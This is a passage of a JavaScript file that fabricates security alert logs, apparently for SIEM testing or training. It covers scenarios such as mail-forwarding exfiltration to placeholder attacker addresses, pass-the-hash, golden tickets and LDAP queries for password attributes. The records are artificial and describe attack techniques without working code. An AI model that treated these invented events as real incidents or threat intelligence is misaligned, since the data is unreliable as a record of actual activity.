                Attachments: getRandomElement(['Invoice_2024.xlsm', 'Contract.docm', 'Report.pptm']),
                Operation: "EmailReceived",
                SenderAddress: getRandomElement(['finance@suspicious-domain.com', 'admin@fake-company.net']),
                firedtimes: 1,
                log_level: "High"
            };
            break;

        case 'Unusual Email Forwarding Rules Set by User':
            log = {
                ...log,
                title: "Suspicious Email Forwarding Rule Created",
                description: `User ${user.upn} created an email forwarding rule directing messages containing sensitive keywords to an external address: "external.collector@gmail.com". Potential data exfiltration attempt.`,
                event_subtype: "MailboxRuleCreated",
                Workload: "Exchange",
                RuleName: "Forward Important Messages",
                ForwardTo: "external.collector@gmail.com",
                RuleConditions: "Subject contains 'confidential' OR 'financial'",
                Operation: "Set-InboxRule",
                ForwardingAddress: getRandomElement(['attacker@gmail.com', 'data-theft@protonmail.com']),
                firedtimes: 1,
                log_level: "Critical"
            };
            break;
            
        case 'Sign-in from Device or IP Not Seen Before':
            const newDeviceIP = getRandomElement(EXTERNAL_IPS);
            const newDeviceCountry = getRandomElement(['Moscow, Russia', 'Lagos, Nigeria', 'Bucharest, Romania']);
            log = {
                ...log,
                title: "Sign-in from Unrecognized Device and Location",
                description: `User ${user.upn} successfully signed in from previously unseen device and IP address ${newDeviceIP}. Sign-in occurred from ${newDeviceCountry} using ${getRandomElement(['Chrome', 'Firefox', 'Edge'])} browser. No MFA verification was performed.`,
                event_subtype: "NewDeviceSignIn",
                ClientIP: newDeviceIP,
                DeviceId: generateGuid(),
                Country: newDeviceCountry.split(',')[1]?.trim() || newDeviceCountry,
                City: newDeviceCountry.split(',')[0]?.trim() || '',
                firedtimes: 1,
                log_level: "High"
            };
            break;

        case 'Email Sent to External Recipient Containing Sensitive Data':
            log = {
                ...log,
                title: "Sensitive Data Sent to External Recipient",
                description: `An email from ${user.upn} was sent to an external recipient (${getRandomElement(['partner@example.com', 'vendor@thirdparty.net'])}) containing sensitive data patterns (e.g., PII or financial data).`,
                event_subtype: "SensitiveEmailOutbound",
                Workload: "Exchange",
                Recipient: getRandomElement(['partner@example.com', 'vendor@thirdparty.net']),
                Subject: "Confidential Report 2024",
                DataKeywords: ["SSN", "Credit Card"],
                log_level: "High"
            };
            break;
        case 'Emails Marked as Spam Despite Being Internal':
            log = {
                ...log,
                title: "Internal Email Marked as Spam",
                description: `An email from an internal sender (${getRandomElement(['internal_phish@corp.com', 'compromised_user@corp.com'])}) was marked as spam by Office 365, indicating potential internal compromise or phishing.`,
                event_subtype: "InternalSpam",
                Workload: "Exchange",
                Sender: getRandomElement(['internal_phish@corp.com', 'compromised_user@corp.com']),
                Recipient: user.upn,
                SpamConfidenceLevel: "High",
                log_level: "Medium"
            };
            break;
        case 'Suspicious OAuth Token Usage for Third-Party App Access':
            log = {
                ...log,
                title: "Suspicious OAuth Application Access",
                description: `A third-party application "${getRandomElement(['Productivity Helper', 'Data Sync App'])}" was granted extensive permissions (e.g., Mail.Read, Files.ReadWrite) to user ${user.name}'s account. This could lead to data exposure.`,
                event_subtype: "OAuthAppAccess",
                ApplicationName: getRandomElement(['Productivity Helper', 'Data Sync App']),
                ApplicationId: generateGuid(),
                PermissionsGranted: ["Mail.Read", "Files.ReadWrite", "Contacts.Read"],
                GrantSource: "External",
                log_level: "Critical"
            };
            break;
        case 'Multiple Quarantine Releases by User in Short Time':
            log = {
                ...log,
                title: "Multiple Quarantine Releases by User",
                description: `User ${user.upn} released ${Math.floor(Math.random() * 5) + 2} quarantined emails in a short period. This unusual activity may bypass security controls.`,
                event_subtype: "QuarantineRelease",
                Workload: "Exchange",
                ReleaseCount: Math.floor(Math.random() * 5) + 2,
                log_level: "Medium"
            };
            break;
        case 'Account Disabled After Suspicious Activity Detected':
            log = {
                ...log,
                title: "Account Disabled Due to Suspicious Activity",
                description: `Account ${user.upn} was automatically disabled by Office 365 after detecting a series of suspicious activities, indicating a potential compromise.`,
                event_subtype: "AccountDisabled",
                Workload: "AzureActiveDirectory",
                Action: "Disable Account",
                Reason: "Suspicious Activity",
                log_level: "Critical"
            };
            break;
        case 'Abnormal Mailbox Size Increase in Short Period':
            log = {
                ...log,
                title: "Abnormal Mailbox Size Increase",
                description: `User ${user.upn}'s mailbox size abnormally increased by ${Math.floor(Math.random() * 500) + 100} MB in a short period, possibly indicating data staging or exfiltration.`,
                event_subtype: "MailboxSizeAnomaly",
                Workload: "Exchange",
                SizeIncreaseMB: Math.floor(Math.random() * 500) + 100,
                log_level: "Medium"
            };
            break;

        default:
            log.title = `Office 365 Alert: ${useCase}`;
            log.description = `${useCase} detected for user ${user.username}`;
            log.event_subtype = "GenericO365Detection";
            break;
    }

    return log;
}

/**
 * Active Directory Log Generator
 */
function generateActiveDirectoryLog(useCase, context) {
    const timestamp = new Date(Date.now() - Math.random() * 24 * 60 * 60 * 1000);
    const user = getRandomElement(USERS);
    const domainController = getRandomElement(['DC01.corp.local', 'DC02.corp.local', 'ADDC01.domain.com']);
    
    let log = {
        event_time: timestamp.toISOString(),
        timestamp: timestamp.toISOString(),
        vendor: "Microsoft",
        product_name: "Active Directory",
        log_source: "ActiveDirectory",
        event_type: "Detection",
        log_level: "Medium",
        device_name: domainController,
        user_name: user.username,
        source_ip: getRandomElement(INTERNAL_IPS),
        EventCode: 4625,
        firedtimes: 1,
        title: "",
        description: "",
        event_subtype: ""
    };

    switch (useCase) {
        case 'Multiple Failed Kerberos Ticket Requests for Single Account':
            const attemptCountKerberos = Math.floor(Math.random() * 12) + 5;
            log = {
                ...log,
                title: "Excessive Kerberos Authentication Failures",
                description: `Account ${user.username} generated ${attemptCountKerberos} failed Kerberos ticket requests from ${domainController} within 5 minutes. This pattern suggests possible password spraying or brute force attack against the account. Source IP: ${getRandomElement(IP_ADDRESSES)}.`,
                event_subtype: "KerberosFailure",
                EventCode: 4771,
                FailureReason: "Pre-authentication failed",
                attempt_count: attemptCountKerberos,
                SourceIP: getRandomElement(IP_ADDRESSES),
                firedtimes: attemptCountKerberos,
                log_level: "High"
            };
            break;

        case 'New Domain Admin Account Created Outside Maintenance Window':
            const newAdminAccount = getRandomElement(['backup_admin', 'temp_admin', 'svc_update', `admin_${Math.random().toString(36).substring(7)}`]);
            log = {
                ...log,
                title: "Privileged Account Created During Non-Business Hours",
                description: `New domain administrator account "${newAdminAccount}" was created at ${timestamp.toLocaleTimeString()} by ${user.username}. This action occurred outside normal maintenance hours and requires immediate investigation for unauthorized privilege escalation.`,
                event_subtype: "PrivilegedAccountCreation",
                EventCode: 4720,
                TargetAccount: newAdminAccount,
                created_by: user.username,
                GroupName: "Domain Admins",
                creation_time: timestamp.toLocaleTimeString('en-US', { hour12: false }),
                firedtimes: 1,
                log_level: "Critical"
            };
            break;

        case 'Unusual Group Membership Changes (e.g., adding users to privileged groups)':
            const targetUserForGroup = getRandomElement(['jsmith', 'mwilson', 'temp_user']);
            const targetGroup = getRandomElement(['Domain Admins', 'Enterprise Admins', 'Backup Operators']);
            log = {
                ...log,
                title: "User Added to Privileged Active Directory Group",
                description: `User ${targetUserForGroup} was added to privileged group "${targetGroup}" by ${user.username}. This change grants elevated privileges and should be verified against change management processes.`,
                event_subtype: "PrivilegedGroupModification",
                event_id: 4728,
                target_group: targetGroup,
                target_user: targetUserForGroup,
                action: "Member Added",
                modified_by: "admin_service",
                firedtimes: 1,
                log_level: "High"
            };
            break;

        case 'Suspicious Logon Hours Detected for High-Privilege Accounts':
            log = {
                ...log,
                title: "Suspicious Logon Hours for Privileged Account",
                description: `A high-privilege account (${user.username}) logged on outside its permitted logon hours on ${domainController}. This could indicate a compromised account or insider threat.`,
                event_subtype: "OffHoursLogon",
                logon_time: timestamp.toLocaleTimeString('en-US', { hour12: false }),
                logon_type: "Network",
                log_level: "High"
            };
            break;
        case 'Use of Pass-the-Ticket or Pass-the-Hash Techniques Detected':
            log = {
                ...log,
                title: "Suspicious NTLM Authentication (Pass-the-Hash/Ticket)",
                description: `NTLM authentication for ${user.username} from an unknown workstation detected. This authentication pattern is consistent with pass-the-hash or pass-the-ticket attack techniques.`,
                event_subtype: "PasstheHashTicket",
                event_id: 4624,
                logon_type: 3,
                authentication_package: "NTLM",
                logon_process: "NtLmSsp",
                source_workstation: "UNKNOWN",
                firedtimes: Math.floor(Math.random() * 5) + 2,
                log_level: "Critical"
            };
            break;
        case 'Unusual LDAP Queries with Sensitive Attribute Requests':
            log = {
                ...log,
                title: "Unusual LDAP Queries for Sensitive Attributes",
                description: `Host ${getRandomElement(HOSTNAMES)} made unusual LDAP queries requesting sensitive attributes (e.g., password hashes, group memberships) from Active Directory. This can be reconnaissance.`,
                event_subtype: "LDAPReconnaissance",
                query_filter: "(objectClass=user)(sAMAccountName=*)",
                requested_attributes: ["sAMAccountName", "unicodePwd", "memberOf"],
                log_level: "Medium"
            };
            break;
        case 'Abnormal Number of Account Lockouts':
            const lockoutCount = Math.floor(Math.random() * 30) + 10;
            log = {
                ...log,
                title: "Abnormal Account Lockouts Detected",
                description: `User ${user.username} experienced ${lockoutCount} account lockouts in a short period, indicating a potential brute-force or password spraying attack.`,
                event_subtype: "AccountLockoutSpike",
                lockout_count: lockoutCount,
                log_level: "High"
            };
            break;
        case 'DC Replication Requests from Unknown Hosts':
            log = {
                ...log,
                title: "DC Replication from Unknown Host",
                description: `A replication request to domain controller ${domainController} originated from an unknown or unauthorized host (${getRandomElement(EXTERNAL_IPS)}). This could indicate compromise.`,
                event_subtype: "DCReplicationAnomaly",
                source_host: getRandomElement(EXTERNAL_IPS),
                log_level: "Critical"
            };
            break;
        case 'Service Account Used Outside Normal Scope or Schedule':
            const serviceAccount = 'svc_webapp';
            log = {
                ...log,
                title: "Service Account Used Out of Scope/Hours",
                description: `Service account "${serviceAccount}" logged on to ${getRandomElement(HOSTNAMES)} outside its normal operational scope or schedule. This indicates potential abuse.`,
                event_subtype: "ServiceAccountAnomaly",
                ServiceAccount: serviceAccount,
                LogonType: getRandomElement(['3', '10']),
                logon_time: timestamp.toLocaleTimeString('en-US', { hour12: false }),
                log_level: "High"
            };
            break;
        case 'Suspicious Kerberos Golden Ticket Usage':
            log = {
                ...log,
                title: "Suspicious Kerberos Golden Ticket Usage",
                description: `A Kerberos golden ticket was potentially used for authentication for ${user.username} on ${domainController}. This is a critical post-compromise technique.`,
                event_subtype: "GoldenTicket",
                ticket_type: "Golden Ticket",
                logon_time: timestamp.toISOString(),
                log_level: "Critical"
            };
            break;

        default:
            log.title = "Active Directory Security Event";
            log.description = `Active Directory security event detected on ${domainController}. Use case: ${useCase}`;
            log.event_subtype = "GeneralADEvent";
    }

    return log;
}

/**
 * DLP Log Generator - Merged logic from outline and original code
 */
function generateDLPLog(useCase, context) {
    const timestamp = new Date(Date.now() - Math.random() * 24 * 60 * 60 * 1000);
    const user = getRandomElement(USERS);
    const hostname = getRandomElement(HOSTNAMES);

    let log = {
        event_time: timestamp.toISOString(),
        timestamp: timestamp.toISOString(),
        vendor: "Symantec",
        product_name: "DLP Protect",
        log_source: "DLP",
        event_type: "Detection",
        log_level: "Medium",
        device_name: hostname,
        user_name: user.username,
        title: "", // Initialize as empty string for specific cases
        description: "", // Initialize as empty string for specific cases
        event_subtype: "", // Initialize as empty string for specific cases
        source_ip: getRandomElement(INTERNAL_IPS),
        policy_name: "Corporate Data Protection",
        firedtimes: 1
    };

    switch (useCase) {
        case 'Sensitive Files Uploaded to Unauthorized Cloud Storage': // Renamed to match the outline's detailed case name
        case 'Data Leakage via Unsanctioned Cloud Storage Upload': // This is the new name from the outline
            const leakedFileHash = getRandomMaliciousHash(); // Using synchronous hash assignment
            const fileCountCloud = Math.floor(Math.random() * 50) + 5;
            const cloudService = getRandomElement(['Dropbox', 'Google Drive', 'OneDrive Personal']);
            const sensitiveDataType = getRandomElement(['credit card numbers', 'social security numbers', 'confidential customer data']);
            log = {
                ...log,
                title: "Sensitive Data Exfiltration to Unsanctioned Cloud Service",
                description: `User ${user.username} uploaded ${fileCountCloud} files containing sensitive data to ${cloudService}. Files contain ${sensitiveDataType}. Upload blocked by DLP policy.`,
                event_subtype: "UnauthorizedCloudUpload",
                destination: "dropbox.com",
                file_name: "Financial_Report_Q4.xlsx", // Using a specific example file name
                file_size: "2.4MB",
                data_classification: "Confidential",
                action_taken: "Blocked",
                CloudService: cloudService,
                SensitiveDataType: sensitiveDataType,
                FileCount: fileCountCloud,
                file_hash: leakedFileHash.sha256, // SETTING THE FIELD AS REQUESTED
                md5_hash: leakedFileHash.md5,     // Adding md5_hash
                threat_name: leakedFileHash.name, // Adding threat_name
                firedtimes: Math.floor(Math.random() * 3) + 1,
                log_level: "High"
            };
            break;

        case 'Mass Download of Confidential Data from Internal File Shares':
            const fileCountDownload = Math.floor(Math.random() * 100) + 20;
            log = {
                ...log,
                title: "Bulk Download of Confidential Files Detected",
                description: `User ${user.username} downloaded ${fileCountDownload} confidential files from network share \\\\fileserver\\confidential\\ within 15 minutes. Files contain sensitive customer information and financial data. This unusual bulk access pattern requires investigation.`,
                event_subtype: "MassDataDownload",
                FileShare: "\\\\fileserver\\confidential\\",
                FileCount: fileCountDownload,
                DataClassification: "Confidential",
                log_level: "High",
                firedtimes: fileCountDownload
            };
            break;

        // --- Retained and enhanced original DLP use cases not explicitly covered by outline's detailed cases ---
        case 'Emails Sent Containing Credit Card or PII Data':
            const piiCount = Math.floor(Math.random() * 8) + 3;
            log = {
                ...log,
                title: "Email Containing PII/Credit Card Data Detected",
                description: `An email from ${user.name} to external recipient contains ${piiCount} instances of sensitive PII data including credit card numbers. Message quarantined for review.`,
                event_subtype: "EmailDLP",
                recipient: "external.partner@gmail.com",
                pii_types: ["Credit Card Numbers", "SSN"],
                pii_count: piiCount,
                action_taken: "Quarantined",
                firedtimes: 1,
                log_level: "High"
            };
            break;
        case 'Copying of Sensitive Documents to USB Drives':
            const filesCopiedUSB = Math.floor(Math.random() * 15) + 5;
            log = {
                ...log,
                title: "Sensitive Documents Copied to USB Drive",
                description: `User ${user.name} copied ${filesCopiedUSB} sensitive documents to a USB storage device. Activity logged for security review.`,
                event_subtype: "RemovableMedia",
                device_type: "USB Storage",
                device_id: "VID_1234&PID_5678",
                files_copied: filesCopiedUSB,
                total_size: "156MB",
                action_taken: "Logged",
                firedtimes: filesCopiedUSB,
                log_level: "High"
            };
            break;
        case 'Printing of Sensitive Documents Outside Normal Hours':
            log = {
                ...log,
                title: "Sensitive Document Printed Off-Hours",
                description: `User ${user.username} printed a sensitive document ("Confidential_Payroll.pdf") outside normal business hours. This could indicate an attempt to exfiltrate data.`,
                event_subtype: "OffHoursPrint",
                document_name: "Confidential_Payroll.pdf",
                printer_name: "HR_Printer",
                print_time: timestamp.toLocaleTimeString('en-US', { hour12: false }),
                log_level: "Medium"
            };
            break;
        case 'Multiple Accesses to Sensitive Files by Non-Privileged Users':
            log = {
                ...log,
                title: "Multiple Accesses to Sensitive Files by Non-Privileged User",
                description: `Non-privileged user ${user.username} accessed multiple sensitive files (e.g., HR records, financial statements) within a short period.`,
                event_subtype: "SensitiveFileAccess",
                file_count_accessed: Math.floor(Math.random() * 10) + 3,
                data_classification: "Restricted",
                log_level: "Medium"
            };
            break;
        case 'Use of Personal Email Accounts to Send Corporate Data':
            log = {
                ...log,
                title: "Corporate Data Sent to Personal Email",
                description: `User ${user.username} attempted to send corporate data to a personal email account (${getRandomElement(['personal.email@gmail.com', 'outlook.live@outlook.com'])}). This is a policy violation.`,
                event_subtype: "PersonalEmailUse",
                personal_email: getRandomElement(['personal.email@gmail.com', 'outlook.live@outlook.com']),
                data_classification: "Internal",
                action_taken: "Blocked",
                log_level: "High"
            };
            break;
        case 'Encrypted Archive Files Created with Sensitive Data Inside':
            log = {
                ...log,
                title: "Encrypted Archive with Sensitive Data Created",
                description: `An encrypted archive file ("${getRandomElement(['backup.zip', 'data.rar'])}) containing sensitive data was created by ${user.username}. This could be staging for exfiltration.`,
                event_subtype: "EncryptedArchive",
                archive_name: getRandomElement(['backup.zip', 'data.rar']),
                encryption_type: "AES-256",
                data_classification: "Confidential",
                log_level: "High"
            };
            break;
        case 'Data Transferred Over Unapproved Protocols (e.g., FTP)':
            log = {
                ...log,
                title: "Data Transfer Over Unapproved Protocol",
                description: `Sensitive data transfer detected over an unapproved protocol (${getRandomElement(['FTP', 'SMB'])}). Policy violation and potential insecure data handling.`,
                event_subtype: "UnapprovedProtocol",
                protocol: getRandomElement(['FTP', 'SMB']),
                destination_ip: getRandomElement(EXTERNAL_IPS),
                data_classification: "Internal",
                log_level: "Medium"
            };
            break;
        case 'Sensitive Data Accessed from Unmanaged Devices':
            log = {
                ...log,
                title: "Sensitive Data Accessed from Unmanaged Device",
                description: `Sensitive data was accessed by ${user.username} from an unmanaged device (e.g., personal laptop, mobile device) which is outside corporate control.`,
                event_subtype: "UnmanagedDeviceAccess",
                device_type: "Personal Laptop",
                source_ip: getRandomElement(EXTERNAL_IPS),
                data_classification: "Confidential",
                log_level: "High"
            };
            break;

        default:
            log.title = "DLP Security Alert";
            log.description = `DLP policy violation detected by user ${user.username}. Sensitive data handling requires investigation.`;
            log.event_subtype = "GeneralDLPEvent";
            break;
    }

    return log;
}

/**
 * Azure Log Generator - Updated to construct full log internally
 */
function generateAzureLog(useCase, context) {
    const timestamp = new Date(Date.now() - Math.random() * 24 * 60 * 60 * 1000);
    const user = getRandomElement(USERS);
    const clientIP = getRandomElement([...EXTERNAL_IPS, ...MALICIOUS_IPS]);
    const subscriptionId = "12345678-1234-1234-1234-123456789012";

    let log = {
        event_time: timestamp.toISOString(),
        timestamp: timestamp.toISOString(),
        vendor: "Microsoft",
        product_name: "Azure Security Center",
        log_source: "Azure",
        event_type: "Detection",
        log_level: getRandomWeightedElement(['Medium', 'High', 'Critical'], [0.3, 0.5, 0.2]),
        user_name: user.username,
        ClientIP: clientIP,
        subscription_id: subscriptionId,
        resource_group: "Production-RG",
        title: "Azure Security Event",
        description: `Azure security event detected for user ${user.username}. Requires investigation.`,
        event_subtype: "AzureActivity",
        firedtimes: 1
    };

    if (useCase.includes('Unfamiliar IP or Country')) {
        const country = getRandomElement(['North Korea', 'Iran', 'China', 'Russia']);
        const city = country === 'North Korea' ? 'Pyongyang' : getRandomElement(['Tehran', 'Beijing', 'Moscow']);
        log = {
            ...log,
            title: "High-Risk Sign-in from Unfamiliar Location",
            description: `Sign-in attempt for ${user.name} from ${country}. Conditional access policy triggered due to unfamiliar geographic location and high risk score.`,
            event_subtype: "SignIn",
            login_result: "Success",
            country: country,
            city: city,
            risk_level: "High",
            conditional_access_result: "Blocked",
            firedtimes: Math.floor(Math.random() * 4) + 2,
            log_level: "Critical"
        };
    }
    else if (useCase.includes('Service Principal with Excessive Permissions')) {
        log = {
            ...log,
            title: "Service Principal Created with High Privileges",
            description: `Service principal "${log.service_principal_name}" created with excessive permissions including Owner and Security Administrator roles. Requires approval validation.`,
            event_subtype: "ServicePrincipalCreation",
            service_principal_name: "AutomationApp",
            permissions_granted: ["Owner", "User Access Administrator", "Security Administrator"],
            created_by: user.upn,
            firedtimes: 1,
            log_level: "Critical"
        };
    }
    // --- Retained and enhanced original Azure use cases (not in outline) ---
    else if (useCase.includes('Multiple Failed Sign-in Attempts Leading to Account Lockout')) {
        log = {
            ...log,
            title: "Multiple Failed Sign-in Attempts to Azure AD",
            description: `User ${user.upn} experienced multiple failed sign-in attempts to Azure AD from ${log.ClientIP}, leading to account lockout. Possible brute-force.`,
            event_subtype: "FailedSignInAttempts",
            login_attempts: Math.floor(Math.random() * 15) + 5,
            account_locked: true,
            log_level: "High"
        };
    }
    else if (useCase.includes('Elevation of Privileges via Role Assignment Changes')) {
        log = {
            ...log,
            title: "Azure Role Assignment Change - Privilege Elevation",
            description: `User ${user.upn} modified role assignments to elevate privileges for ${getRandomElement(['another_user@corp.com', 'service_account'])} to 'Owner' on a critical resource group.`,
            event_subtype: "RoleAssignmentChange",
            target_user_or_sp: getRandomElement(['another_user@corp.com', 'service_account']),
            new_role: "Owner",
            scope: `/subscriptions/${subscriptionId}/resourceGroups/Critical-RG`,
            log_level: "Critical"
        };
    }
    else if (useCase.includes('Suspicious API Calls from Unrecognized Applications')) {
        log = {
            ...log,
            title: "Suspicious API Calls from Unrecognized Application",
            description: `Unrecognized application with ID ${generateGuid()} made suspicious API calls within Azure, possibly indicating a compromised application or unauthorized access.`,
            event_subtype: "SuspiciousAPICall",
            application_id: generateGuid(),
            api_call: "Microsoft.Compute/virtualMachines/write",
            log_level: "High"
        };
    }
    else if (useCase.includes('New Virtual Machine Created with Public IP in Restricted Subnet')) {
        log = {
            ...log,
            title: "VM Created with Public IP in Restricted Subnet",
            description: `A new virtual machine was created with a public IP address in a subnet designated as restricted. This poses a security risk.`,
            event_subtype: "VMProvisioning",
            vm_name: "unsecured-vm",
            public_ip: getRandomElement(EXTERNAL_IPS),
            subnet_name: "RestrictedSubnet",
            log_level: "High"
        };
    }
    else if (useCase.includes('Mass Deletion or Modification of Azure Storage Blobs')) {
        log = {
            ...log,
            title: "Mass Deletion/Modification of Azure Storage Blobs",
            description: `User ${user.upn} performed a mass deletion or modification of Azure Storage Blobs in a critical storage account. Potential data loss or integrity issue.`,
            event_subtype: "StorageBlobModification",
            storage_account: "criticalstorage",
            operation: getRandomElement(["Delete Blob", "Set Blob Tier"]),
            blob_count: Math.floor(Math.random() * 50) + 10,
            log_level: "Critical"
        };
    }
    else if (useCase.includes('Abnormal Data Transfer Volume in Azure Blob Storage')) {
        log = {
            ...log,
            title: "Abnormal Data Transfer from Azure Blob Storage",
            description: `Abnormal outbound data transfer volume (${Math.floor(Math.random() * 1000) + 100} GB) detected from Azure Blob Storage, potentially indicating data exfiltration.`,
            event_subtype: "StorageDataExfiltration",
            storage_account: "dataarchive",
            transfer_volume_gb: Math.floor(Math.random() * 1000) + 100,
            log_level: "High"
        };
    }
    else if (useCase.includes('Unusual Network Security Group (NSG) Rule Changes')) {
        log = {
            ...log,
            title: "Unusual NSG Rule Changes",
            description: `Unusual modifications to Network Security Group (NSG) rules detected, potentially opening up new attack vectors or bypassing existing controls.`,
            event_subtype: "NSGRuleModification",
            nsg_name: "Production-NSG",
            rule_change: "Allow All Inbound from Any",
            log_level: "Critical"
        };
    }
    else if (useCase.includes('Login Using Legacy Authentication Protocols (e.g., Basic Auth)')) {
        log = {
            ...log,
            title: "Legacy Authentication Protocol Login",
            description: `User ${user.upn} logged in using a legacy authentication protocol (e.g., Basic Auth) which is less secure and generally deprecated.`,
            event_subtype: "LegacyAuthLogin",
            authentication_protocol: "Basic Auth",
            log_level: "Medium"
        };
    }
    else if (useCase.includes('Azure AD Password Reset Requests from Suspicious Locations')) {
        log = {
            ...log,
            title: "Azure AD Password Reset from Suspicious Location",
            description: `Password reset request for ${user.upn} initiated from a suspicious geographic location (${getRandomElement(['Nigeria', 'Vietnam'])}).`,
            event_subtype: "PasswordResetRequest",
            request_country: getRandomElement(['Nigeria', 'Vietnam']),
            log_level: "High"
        };
    }
    else if (useCase.includes('Disabled Multi-Factor Authentication (MFA) on Privileged Accounts')) {
        log = {
            ...log,
            title: "MFA Disabled on Privileged Account",
            description: `Multi-Factor Authentication (MFA) was disabled for privileged account ${user.upn}. This significantly increases the risk of compromise.`,
            event_subtype: "MFADisabled",
            action_by: getRandomElement(['admin_user', user.upn]),
            log_level: "Critical"
        };
    }
    else if (useCase.includes('Suspicious Use of Azure Functions to Execute Unknown Code')) {
        log = {
            ...log,
            title: "Suspicious Azure Function Execution",
            description: `An Azure Function executed unknown or suspicious code, potentially for malicious purposes or C2 communication.`,
            event_subtype: "AzureFunctionExecution",
            function_name: "MaliciousFunctionApp",
            execution_context: "HttpTrigger",
            log_level: "High"
        };
    }
    else if (useCase.includes('Creation of Excessive Storage Account Access Keys')) {
        log = {
            ...log,
            title: "Excessive Azure Storage Account Access Key Creation",
            description: `Excessive creation of access keys for an Azure Storage Account detected, indicating potential enumeration or exfiltration setup.`,
            event_subtype: "StorageKeyCreation",
            storage_account_name: "importantdata",
            key_creation_count: Math.floor(Math.random() * 5) + 2,
            log_level: "High"
        };
    }
    else if (useCase.includes('Outbound Traffic to Known Malicious IPs from Azure Resources')) {
        log = {
            ...log,
            title: "Outbound Traffic to Malicious IP from Azure Resource",
            description: `An Azure Virtual Machine or resource initiated outbound traffic to a known malicious IP address (${getRandomElement(MALICIOUS_IPS)}), indicating compromise.`,
            event_subtype: "MaliciousOutboundConnection",
            resource_id: "/subscriptions/res-id/vms/webserver-01",
            destination_ip: getRandomElement(MALICIOUS_IPS),
            log_level: "Critical"
        };
    }
    else if (useCase.includes('Service Account Used Outside Normal Working Hours')) {
        log = {
            ...log,
            title: "Azure Service Account Used Off-Hours",
            description: `An Azure service account (${getRandomElement(['automation-sp', 'devops-sp'])}) was used outside its normal working hours, suggesting potential misuse.`,
            event_subtype: "ServiceAccountOffHours",
            service_principal_name: getRandomElement(['automation-sp', 'devops-sp']),
            activity_time: timestamp.toLocaleTimeString('en-US', { hour12: false }),
            log_level: "Medium"
        };
    }
    else if (useCase.includes('Azure Sentinel Alert: Suspicious Activity on Virtual Machines')) {
        log = {
            ...log,
            title: "Azure Sentinel Alert: Suspicious VM Activity",
            description: `Azure Sentinel generated an alert regarding suspicious activity on a virtual machine (${getRandomElement(['prod-web-01', 'dev-db-02'])}), indicating potential compromise.`,
            event_subtype: "SentinelAlert",
            alert_name: "VM Anomalous Login",
            vm_name: getRandomElement(['prod-web-01', 'dev-db-02']),
            log_level: "High"
        };
    }
    else if (useCase.includes('Creation of Publicly Accessible SQL Database Instances')) {
        log = {
            ...log,
            title: "Publicly Accessible Azure SQL DB Created",
            description: `A new Azure SQL Database instance was created with public accessibility enabled, exposing it to the internet without proper controls.`,
            event_subtype: "PublicSQLDB",
            db_name: "prod-db-public",
            firewall_rules: "0.0.0.0/0",
            log_level: "Critical"
        };
    }
    else if (useCase.includes('Unauthorized Subscription or Resource Group Creation')) {
        log = {
            ...log,
            title: "Unauthorized Azure Subscription/Resource Group Creation",
            description: `An unauthorized Azure subscription or resource group (${getRandomElement(['test-rg-unauth', 'new-sub-malicious'])} was created by ${user.upn}.`,
            event_subtype: "UnauthorizedResourceCreation",
            resource_type: getRandomElement(['Subscription', 'Resource Group']),
            resource_name: getRandomElement(['test-rg-unauth', 'new-sub-malicious']),
            log_level: "Critical"
        };
    }
    else if (useCase.includes('Excessive Failed Attempts to Access Key Vault Secrets')) {
        log = {
            ...log,
            title: "Excessive Failed Key Vault Secret Access Attempts",
            description: `Multiple failed attempts to access secrets within an Azure Key Vault by ${user.upn}, indicating enumeration or brute-force against secrets.`,
            event_subtype: "KeyVaultBruteForce",
            key_vault_name: "ProdSecrets",
            failed_attempts: Math.floor(Math.random() * 20) + 5,
            log_level: "High"
        };
    }

    return log;
}

/**
 * AWS Log Generator - Updated to construct full log internally
 */
function generateAWSLog(useCase, context) {
    const timestamp = new Date(Date.now() - Math.random() * 24 * 60 * 60 * 1000);
    const user = getRandomElement(USERS);
    const clientIP = getRandomElement([...EXTERNAL_IPS, ...MALICIOUS_IPS]);
    const accountId = "123456789012";

    let log = {
        event_time: timestamp.toISOString(),
        timestamp: timestamp.toISOString(),
        vendor: "Amazon",
        product_name: "CloudTrail",
        log_source: "AWS",
        event_type: "Detection",
        log_level: getRandomWeightedElement(['Medium', 'High', 'Critical'], [0.3, 0.5, 0.2]),
        user_name: user.username,
        source_ip: clientIP,
        account_id: accountId,
        region: "us-east-1",
        title: "AWS Security Event",
        description: `AWS security event detected for user ${user.username}. Requires investigation.`,
        event_subtype: "AWSCloudTrail",
        firedtimes: 1
    };

    if (useCase.includes('Root Account')) {
        log = {
            ...log,
            title: "Root Account Used for Console Access",
            description: `AWS root account used for console login from ${clientIP}. Root account should only be used for account setup and emergency procedures, not daily operations.`,
            user_identity: "root",
            event_name: "ConsoleLogin",
            user_agent: getRandomElement(USER_AGENTS),
            log_level: "Critical",
            firedtimes: 1
        };
    }
    else if (useCase.includes('CloudTrail Logs')) {
        log = {
            ...log,
            title: "CloudTrail Logging Disabled",
            description: `CloudTrail logging stopped for trail "SecurityAuditTrail" by user ${user.username}. Disabling audit logs may indicate an attempt to hide malicious activity.`,
            event_subtype: "CloudTrailModification", // More specific subtype
            event_name: "StopLogging",
            trail_name: "SecurityAuditTrail",
            user_identity: user.username,
            log_level: "Critical",
            firedtimes: 1
        };
    }
    // --- Retained and enhanced original AWS use cases (not in outline) ---
    else if (useCase.includes('Multiple Failed Login Attempts Leading to Account Lockout')) {
        log = {
            ...log,
            title: "Multiple Failed AWS Login Attempts",
            description: `User ${user.username} experienced multiple failed login attempts to AWS console from ${log.source_ip}, possibly indicating brute-force or credential stuffing.`,
            event_subtype: "FailedLoginAttempts", // More specific subtype
            event_name: "ConsoleLogin",
            error_code: "AuthFailure",
            attempts: Math.floor(Math.random() * 10) + 3,
            log_level: "High"
        };
    }
    else if (useCase.includes('Creation of IAM User with Administrator Privileges')) {
        log = {
            ...log,
            title: "IAM User Created with Administrator Privileges",
            description: `New IAM user "${getRandomElement(['new-admin-user', 'dev-ops-admin'])}" created with AdministratorAccess policy. This is a high-privilege action.`,
            event_subtype: "IAMUserCreation", // More specific subtype
            event_name: "CreateUser",
            user_name: getRandomElement(['new-admin-user', 'dev-ops-admin']),
            policy_attached: "AdministratorAccess",
            log_level: "Critical"
        };
    }
    else if (useCase.includes('Excessive Creation of Access Keys for IAM Users')) {
        log = {
            ...log,
            title: "Excessive IAM Access Key Creation",
            description: `Excessive creation of access keys for IAM user ${user.username}. This could indicate compromise or a malicious actor setting up persistence.`,
            event_subtype: "IAMAccessKeyCreation", // More specific subtype
            event_name: "CreateAccessKey",
            access_key_count: Math.floor(Math.random() * 5) + 2,
            log_level: "High"
        };
    }
